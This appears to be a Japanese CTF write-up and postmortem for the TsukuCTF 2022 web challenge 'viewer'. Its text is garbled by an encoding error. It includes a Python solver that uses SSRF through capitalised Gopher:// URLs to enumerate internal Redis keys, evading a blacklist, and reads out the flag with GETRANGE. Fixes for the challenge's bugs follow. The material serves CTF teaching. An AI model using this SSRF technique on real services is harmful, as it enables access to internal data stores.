like!\n\n## é›£æ˜“åº¦\n\nMedium\n\n## è§£æ³•\n\né…å¸ƒã•ã‚Œã¦ã„ã‚‹ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’èª­ã‚€ã¨ã€redis ã®ä¸­ã« FLAG ãŒå«ã¾ã‚Œã¦ã„ã‚‹ã“ã¨ãŒåˆ†ã‹ã‚‹ã€‚\\\ncurl ã§ redis ã¨ã„ã†ã“ã¨ã¯åˆ¥ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’åˆ©ç”¨ã—ãŸ SSRF ãŒæ€ã„æµ®ã‹ã¶ã€‚\\\nFlag ãŒå­˜åœ¨ã—ã¦ã„ã‚‹å ´æ‰€ã¯`app.py` ä¸Šã‹ redis å†…éƒ¨ã§ã‚ã‚‹ãŸã‚ã€ã„ãšã‚Œã‹ã®æƒ…å ±ã‚’æŠœãå–ã‚ŠãŸã„ã€‚\\\nå‰è€…ã¯ `file://` schemeã€å¾Œè€…ã¯ `gopher://` ã‚„`dict://` scheme ã‚’åˆ©ç”¨ã™ã‚‹ã“ã¨ã«ãªã‚Šãã†ã ã€‚\n\nã—ã‹ã—ã€å‰è€…ã¯ä»¥ä¸‹ã® `response_sanitizer` ã«ã‚ˆã£ã¦ã‚µãƒ‹ã‚¿ã‚¤ã‚ºã•ã‚Œã‚‹ãŸã‚ã€å¾Œè€…ã‚’åˆ©ç”¨ã™ã‚‹ã“ã¨ã«ã™ã‚‹ã€‚\n\n```python\n# app.py\n# a response is also sanitized just in case because the flag is super sensitive information.\nblacklist_in_response = ['TsukuCTF22']\n\ndef response_sanitizer(body: str) -\u003e str:\n    if any([scheme in body for scheme in blacklist_in_response]):\n        return \"SANITIZED: a sensitive data is included!\"\n    return body\n```\n\n`gopher://` ç­‰ã¯ç¦æ­¢ã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«è¦‹ãˆã‚‹ãŒã€case-insensitive ãªã®ã§å¤§æ–‡å­—ã‚’å«ã‚ã‚‹ã“ã¨ã§å›é¿ã§ãã‚‹ã€‚\n\nãŸã ã—ã€gopher ã§å¯¾è±¡ã® value ã‚’å–ã‚‹ãŸã‚ã«ã€redis ã® key ã‚’çŸ¥ã‚‹å¿…è¦ãŒã‚ã‚‹ã€‚\\\nkey ã¯ redis ã® `keys *` ã§å…¨åˆ—æŒ™ã§ãã‚‹ãŸã‚ã€å…¨ã¦ã® key ã‚’åˆ—æŒ™ã—ã¦ response ã« flag ãŒå«ã¾ã‚Œã‚‹ã‚‚ã®ã‚’é¸æŠã™ã‚Œã°è‰¯ã„ã€‚\n\nã¾ãŸã€`TsukuCTF22`ã¨ã„ã†æ–‡å­—åˆ—ã‚’å«ã‚€å ´åˆã¯ã‚µãƒ‹ã‚¿ã‚¤ã‚ºã•ã‚Œã‚‹ãŒã€`GETRANGE` ã§ä¸€éƒ¨ã‚’æŠœãå‡ºã™ã“ã¨ã§å¯¾å‡¦ã§ãã‚‹ã€‚\\\nã—ãŸãŒã£ã¦ã€æ–¹é‡ã¯ä»¥ä¸‹ã®é€šã‚Šã«ãªã‚‹ã€‚\\\nã¾ãšã€redis ã«å«ã¾ã‚Œã‚‹ key ã‚’å…¨åˆ—æŒ™ã—ã€æ¬¡ã« GETRANGE ã§åˆ—æŒ™ã—ãŸã‚‚ã®ã®ä¸€éƒ¨ã‚’èª­ã¿å–ã‚‹ã€‚\n\nsolver ã¯ä»¥ä¸‹ã®é€šã‚Šã€‚\n\n```python\nimport requests\nfrom urllib.parse import quote\nimport re\nimport sys\n\n# CHANGE HERE with an appropriate url\nTARGET_URL = \"http://127.0.0.1:31555\"\n\n# enumerate redis keys\nform = {\n    \"url\": \"Gopher://redis:6379/+\" + quote(\"keys *\\r\\nQUIT\\r\\n\")\n}\ncookies = {\n    \"__SESSION_ID\": \"d8c7d141-b8da-416b-a220-d8d7218c8bbc\", # dummy session id\n}\nres = requests.post(TARGET_URL, data=form, cookies=cookies)\n\nsession_id_list = re.findall(\"(.+-.+-.+-.+-.+)\\r\", res.text)\n# print(session_id_list)\n\n# check redis value\nfor session_id in session_id_list:\n    form[\"url\"] = \"Gopher://redis:6379/+\" + quote(f\"GETRANGE {session_id} 60 -1\\r\\nQUIT\\r\\n\")\n    cookies[\"__SESSION_ID\"] = session_id\n    res = requests.post(TARGET_URL, data=form, cookies=cookies)\n    if \"CTF22{\" in res.text:\n        print(\"TsukuCTF22{\" + res.text[res.text.find(\"CTF22{\") + len(\"CTF22{\"):res.text.find(\"}\u0026#34;\")] + \"}\")\n        sys.exit(0)\n\n```\n\nä¸Šè¨˜ã®ã‚½ãƒ«ãƒã‚’å®Ÿè¡Œã™ã‚‹ã¨ã€ä»¥ä¸‹ã® Flag ãŒå¾—ã‚‰ã‚Œã‚‹ã€‚\n\n    TsukuCTF22{ur1_scheme_1s_u5efu1}\n\n## ãƒã‚¹ãƒˆãƒ¢ãƒ¼ãƒ†ãƒ \n\n### ä½•ãŒèµ·ã“ã£ãŸã‹\n\nå‰æã¨ã—ã¦ã€å®Ÿè£…ã‚³ãƒ¼ãƒ‰ã«ä¸å‚™ãŒã‚ã£ãŸãŸã‚ã«ã€å•é¡Œã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹æ™‚ã« Cookie ã«æ ¼ç´ã•ã‚Œã‚‹ `__SESSION_ID` ãŒå…±æœ‰ã•ã‚Œã¦ã„ã‚‹ã¨ã„ã†å•é¡ŒãŒã‚ã‚Šã¾ã—ãŸã€‚\n\næœ¬æ¥ã§ã‚ã‚Œã°ã“ã®å•é¡Œã«ã‚ˆã‚Š Flag ãŒå–å¾—ã§ããªã„ã¯ãšã§ã™ã€‚ã—ã‹ã—ã€é…å¸ƒã•ã‚ŒãŸã‚³ãƒ¼ãƒ‰ã¨æœ¬ç•ªç’°å¢ƒã®ã‚³ãƒ¼ãƒ‰ã® Flag ã‚’ Redis ã«è¿½åŠ ã™ã‚‹éƒ¨åˆ†ã«å·®ç•°ãŒã‚ã£ãŸãŸã‚ã«ã€é…å¸ƒã•ã‚ŒãŸã‚³ãƒ¼ãƒ‰ã§æ§‹ç¯‰ã§ãã‚‹ç’°å¢ƒã«ã‚ˆã£ã¦ã¯ Flag ãŒå–å¾—ã§ããªã„ã«ã‚‚æ‹˜ã‚‰ãšã€æœ¬ç•ªç’°å¢ƒã§ã¯ Flag ãŒå–å¾—ã§ãã‚‹ã¨ã„ã†ç¾è±¡ãŒèµ·ãã¾ã—ãŸã€‚\n\nå®Ÿéš›ã«æœ¬ç•ªä¸­ã¯ã‚½ãƒ«ãƒã«ã‚ˆã£ã¦ Flag ãŒå–å¾—ã§ãã‚‹ã“ã¨ã®ã¿ã‚’ç¢ºèªã—ã¦ã„ãŸãŸã‚ã€ã“ã®å•é¡Œã«æ°—ã¥ã‘ã¾ã›ã‚“ã§ã—ãŸã€‚\n\n### æŠ€è¡“çš„è©³ç´°\n\nã‚³ãƒ¼ãƒ‰ã‚’ç”¨ã„ã¦å…·ä½“çš„ã«èª¬æ˜ã—ã¾ã™ã€‚\n\nã¾ãšã€ä»¥ä¸‹ãŒé…å¸ƒã•ã‚ŒãŸã‚³ãƒ¼ãƒ‰ã§ Flag ã‚’ Redis ã«è¿½åŠ ã™ã‚‹éƒ¨åˆ†ã®ã‚³ãƒ¼ãƒ‰ã§ã™ã€‚\n\n```python\n# initialization\nredis = redis.Redis(host='redis', port=6379, db=0)\nflag = \"TsukuCTF22{dummy flag}\" # the flag is replaced a real flag in a production environment.\nid = str(uuid.uuid4())\nredis.set(id, json.dumps({\"id\": id, \"name\": flag}))\n```\n\nã“ã‚Œã«ã‚ˆã‚Šã€UUIDv4 ã‚’ ID ã¨ã—ãŸ Flag ã‚’å«ã‚€ãƒ‡ãƒ¼ã‚¿ãŒ Redis ã«ç™»éŒ²ã•ã‚Œã¾ã™ã€‚\n\nã—ã‹ã—ã€ã‚¢ã‚«ã‚¦ãƒ³ãƒˆç™»éŒ²ã®éƒ¨åˆ†ã«ã¦ä»¥ä¸‹ã®é€šã‚Šãã® ID ã«å¯¾ã—ã¦ä¸Šæ›¸ããŒè¡Œã‚ã‚Œã¾ã™ã€‚\n\n```python\n    redis.set(id, json.dumps({\"id\": str(uuid.uuid4()), \"name\": name}))\n    redis.expire(id, 100)\n```\n\nãã®çµæœã€Redis ã«ç™»éŒ²ã•ã‚ŒãŸ Flag ãŒåå‰ã§ä¸Šæ›¸ãã•ã‚Œã¦ã—ã¾ã„ã¾ã™ã€‚\n\nè©³ã—ãã¯[mopi ã•ã‚“ã®ãƒ–ãƒ­ã‚°](https://mopisec.hatenablog.com/entry/2022/10/24/180123#viewer-8-solves-not-solved)ã«ã¦æ¤œè¨¼ã•ã‚Œã¦ã„ã‚‹ãŸã‚ã”è¦§ãã ã•ã„ã€‚æ¤œè¨¼ã¾ã§ãƒ–ãƒ­ã‚°ã«æ²è¼‰ã—ã¦ãã ã•ã£ãŸ mopi ã•ã‚“ã€ã‚ã‚ŠãŒã¨ã†ã”ã–ã„ã¾ã—ãŸ ğŸ™\n\n***\n\nä¸€æ–¹ã€ä»¥ä¸‹ãŒæœ¬ç•ªç’°å¢ƒã®ã‚³ãƒ¼ãƒ‰ã§ Flag ã‚’ Redis ã«è¿½åŠ ã™ã‚‹éƒ¨åˆ†ã®ã‚³ãƒ¼ãƒ‰ã§ã™ã€‚\n\n```python\n# user session information\nredis = redis.Redis(host='redis', port=6379, db=0)\nusers = ['frt', 'ny_a', 'satoki', 'shio', 'taisyo', 'task', \"TsukuCTF22{ur1_scheme_1s_u5efu1}\", 'toto', 'xryuseix', 'y-chan', 'yu1k', 'yoshimi', 'ling', 'momoka', 'taru', 'imino']\nfor user in users:\n    id = str(uuid.uuid4())\n    redis.set(id, json.dumps({\"id\": id, \"name\": user}))\n```\n\n`id` ã¯ãƒ«ãƒ¼ãƒ—ã§ã‚¤ãƒ†ãƒ¬ãƒ¼ãƒˆã•ã‚Œã¦ã„ã‚‹ãŸã‚ã€`id`ãŒå¤‰æ›´ã•ã‚Œã‚‹ã®ã¯æœ€å¾Œã®ãƒ¦ãƒ¼ã‚¶ã®ã¿ã«ãªã‚Šã¾ã™ã€‚ãã®ãŸã‚ã€æœ¬ç•ªç’°å¢ƒã§ã¯ Flag ã®ä¸Šæ›¸ããŒç™ºç”Ÿã—ã¾ã›ã‚“ã§ã—ãŸã€‚\n\n### æ ¹æœ¬åŸå› \n\n**æ ¹æœ¬åŸå› ã¯ãƒ¦ãƒ¼ã‚¶ç™»éŒ²ã‚’è¡Œã† id ç”¨ã® UUIDv4 ã‚’å†ç”Ÿæˆã—ã¦ã„ãªã‹ã£ãŸã“ã¨** ã«ã‚ã‚Šã¾ã™ã€‚ãã®å½±éŸ¿ã§ã€é…å¸ƒã•ã‚ŒãŸã‚³ãƒ¼ãƒ‰ã§æ§‹ç¯‰ã•ã‚Œã‚‹ç’°å¢ƒã§ã¯ã€Redis ã«è¿½åŠ ã•ã‚ŒãŸ Flag ãŒä¸Šæ›¸ãã•ã‚Œã¦ã—ã¾ã„å–å¾—ã™ã‚‹ã“ã¨ãŒä¸å¯èƒ½ã«ãªã‚Šã¾ã™ã€‚\n\nã—ã‹ã—ã€ä¸Šè¨˜ã®é€šã‚Šã€**æœ¬ç•ªç’°å¢ƒã§ã¯ Redis ã«ãƒ€ãƒŸãƒ¼ãƒ‡ãƒ¼ã‚¿ã‚’å«ã‚ã¦ Flag ã‚’æŒ¿å…¥ã—ã¦ã„ãŸãŸã‚ã«ã€Flag ãŒä¸Šæ›¸ãã•ã‚Œãšã«å–å¾—ã§ãã¦ã„ã¾ã—ãŸ**ã€‚ã“ã®å·®ç•°ã¯ä½œå•æ™‚ã‹ã‚‰å«ã¾ã‚Œã¦ã„ã¾ã—ãŸãŒã€ä½œå•æ™‚ã«ã¯ä½œå•æ–¹é‡ã¨è§£æ³•ã®æµã‚Œã®ã¿ãŒãƒ¬ãƒ“ãƒ¥ãƒ¼ã•ã‚Œã¦ã„ãŸãŸã‚ã«ã€ã“ã®å•é¡Œã«æ°—ã¥ã‘ã¾ã›ã‚“ã§ã—ãŸã€‚\n\nã¾ãŸã€æœ¬ç•ªä¸­ã¯ç´„ 1 æ™‚é–“ã”ã¨ã« 1 å›ã‚½ãƒ«ãƒã‚’å›ã—ã¦ Flag ãŒå¾—ã‚‰ã‚Œã‚‹ã“ã¨ã®ã¿ã‚’ç¢ºèªã—ã¦ã„ãŸãŸã‚ã«ã€é…å¸ƒãƒ•ã‚¡ã‚¤ãƒ«ã«ã¯æ°—ã‚’é…ã‚Œã¦ã„ã¾ã›ã‚“ã§ã—ãŸã€‚\n\n### è§£æ±º\n\nä»¥ä¸‹ã®é€šã‚Š `id` ã‚’ç”Ÿæˆã—ã¦ã‹ã‚‰ç™»éŒ²ã™ã‚‹ã“ã¨ã§ã€æ­£ã—ã„å®Ÿè£…ã«ãªã‚Šã¾ã™ã€‚\n\n```python\n    id = uuid.uuid4()\n    redis.set(id, json.dumps({\"id\": str(id), \"name\": name}))\n    redis.expire(id, 100)\n```\n\n### å½±éŸ¿\n\nå½±éŸ¿ã‚’å—ã‘ãŸãƒ¦ãƒ¼ã‚¶ã¯å…¨ãƒ¦ãƒ¼ã‚¶ã§ã™ã€‚ä¸€å¿œã€æœ¬ä»¶ã«é–¢ã—ã¦è¨€åŠã—ã¦ãã ã•ã£ãŸãƒ–ãƒ­ã‚°ã‚„ãƒ„ã‚¤ãƒ¼ãƒˆã‚’è¼‰ã›ã¦ãŠãã¾ã™ã€‚\n\n*   [TsukuCTF 2022 Writeup](https://mopisec.hatenablog.com/entry/2022/10/24/180123#viewer-8-solves-not-solved)\n*   [ãƒ„ã‚¤ãƒ¼ãƒˆ 1](https://twitter.com/zeosutt/status/1584214650853683200)\n*   [ãƒ„ã‚¤ãƒ¼ãƒˆ 2](https://twitter.com/shinobe179/status/1584574685718585344)\n\n### å¯¾å¿œè€…\n\nå•é¡ŒãŒç™ºè¦šã—ãŸã®ã¯ CTF çµ‚äº†å¾Œã ã£ãŸãŸã‚ã€æœ¬ç•ªä¸­ã®å¯¾å¿œè€…ã¯ã„ã¾ã›ã‚“ã€‚\n\n### è¿½è¨˜\n\nå®Ÿè£…ã«é–¢ã—ã¦ã€ä»–ã«ã‚‚ä¿®æ­£ã™ã¹ãç‚¹ãŒã„ãã¤ã‹ã‚ã£ãŸã®ã§ä»¥ä¸‹ã«è¨˜è¼‰ã—ã¦ãŠãã¾ã™ã€‚\n\n**Exception ãŒèµ·ããŸæ™‚ã« PycURL ã®ã‚³ãƒã‚¯ã‚·ãƒ§ãƒ³ãŒ close ã•ã‚Œãªã„**\n\né…å¸ƒãƒ•ã‚¡ã‚¤ãƒ«ã¯ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã£ã¦ãŠã‚Šã€PycURL ã§ `c.perform()` å®Ÿè¡Œæ™‚ã« Exception ãŒç™ºç”Ÿã—ãŸå ´åˆã¯ `c.close()` ãŒå‘¼ã°ã‚Œã¾ã›ã‚“ã€‚\n\n```python\n        buf = BytesIO()\n        try:\n            c = pycurl.Curl()\n            c.setopt(c.URL, url)\n            c.setopt(c.WRITEDATA, buf)\n            c.perform()\n            c.close()\n\n            body = buf.getvalue().decode('utf-8')\n        except Exception as e:\n            traceback.print_exc()\n            abort(\"error occurs\")\n```\n\nã—ãŸãŒã£ã¦ã€ä»¥ä¸‹ã®é€šã‚Š `finally` å¥ã‚’åˆ©ç”¨ã™ã‚‹ã¹ãã§ã™ã€‚\n\n```python\n        buf = BytesIO()\n        c = None\n        try:\n            c = pycurl.Curl()\n            c.setopt(c.URL, url)\n            c.setopt(c.WRITEDATA, buf)\n            c.perform()\n\n            body = buf.getvalue().decode('utf-8')\n        except Exception as e:\n            traceback.print_exc()\n            abort(\"error occurs\")\n        finally:\n            c.close()\n```\n\n**PycURL ã®ã‚¿ã‚¤ãƒ ã‚¢ã‚¦ãƒˆãŒè¨­ã‘ã‚‰ã‚Œã¦ã„ãªã„**\n\nPycURL ã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ 300\\[s]ã®ã‚³ãƒã‚¯ã‚·ãƒ§ãƒ³ã‚¿ã‚¤ãƒ ã‚¢ã‚¦ãƒˆã‚’æŒã£ã¦ã„ã¾ã™ãŒã€ä»Šå›ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®è¦ä»¶ã«ã¯é•·ã™ãã§ã™ã€‚ä»Šå›ã®å•é¡Œã§ã¯å¾—ã‚‰ã‚ŒãŸ Redis ã® key ã«å¯¾ã—ã¦å…¨æ¢ç´¢ã‚’è¡Œã†å¿…è¦ãŒã‚ã‚Šã€ã‚³ãƒã‚¯ã‚·ãƒ§ãƒ³ãŒé›†ä¸­ã™ã‚‹ã“ã¨ã¯å®¹æ˜“ã«æƒ³å®šã§ãã‚‹ãŸã‚ã€ã‚¿ã‚¤ãƒ ã‚¢ã‚¦ãƒˆã¯ 10\\[s]ãã‚‰ã„ã«è¨­å®šã—ã¦ãŠã„ã¦ã‚‚è‰¯ã‹ã£ãŸã®ã§ã¯ãªã„ã‹ã¨æ€ã„ã¾ã—ãŸã€‚\n\n### ãŠã‚ã‚Šã«\n\nã“ã®åº¦ã¯ã€ä½œå•è€…ã®å®Ÿè£…ä¸å‚™ã«ã‚ˆã£ã¦ã€å‚åŠ è€…ä½“é¨“ã‚’æ‚ªãã—ã¦ã—ã¾ã£ãŸã“ã¨ã‚’æ·±ããŠè©«ã³ç”³ã—ä¸Šã’ã¾ã™ã€‚\nä»Šå¾Œã¯ãƒ¬ãƒ“ãƒ¥ãƒ¼æ™‚ã«è§£æ³•ã®æ–¹é‡ã‚„ãƒ•ãƒ©ã‚°ãƒã‚§ãƒƒã‚¯ç”¨ã®ã‚½ãƒ«ãƒã ã‘ã§ãªãã€é…å¸ƒãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚‚æ°—ã‚’é…ã£ã¦ãƒ¬ãƒ“ãƒ¥ãƒ¼ã™ã‚‹äºˆå®šã§ã™ã€‚\n\nã¾ãŸã€ä»–ã®å‚åŠ è€…ã‚‚å«ã‚ãŸã‚ˆã‚Šè‰¯ã„ CTF ä½“é¨“ã®ãŸã‚ã«ã€Discord ã§ã®#ask-to-admin ã«ã¦ãŠå•ã„åˆã‚ã›ã„ãŸã ããªã©ã®ã”å”åŠ›ã‚’ãŠé¡˜ã„ã„ãŸã—ã¾ã™ã€‚\n\n## å‚è€ƒè³‡æ–™\n\n*   [ãƒã‚¹ãƒˆãƒ¢ãƒ¼ãƒ†ãƒ ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆ - PagerDuty](https://ueokande.github.io/incident-response-docs-ja/after/post_mortem_template/)\n","title":"viewer","description":"Writeups for TsukuCTF21 have been published. Check them out if you'd like!","author":"task4233","genre":"Web","solver":8,"point":500}},"__N_SSG":true},"page":"/ctf/TsukuCTF2022/[id]","query":{"id":"viewer"},"buildId":"E8Mu5MlMTR0xFKIeOx1KX","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>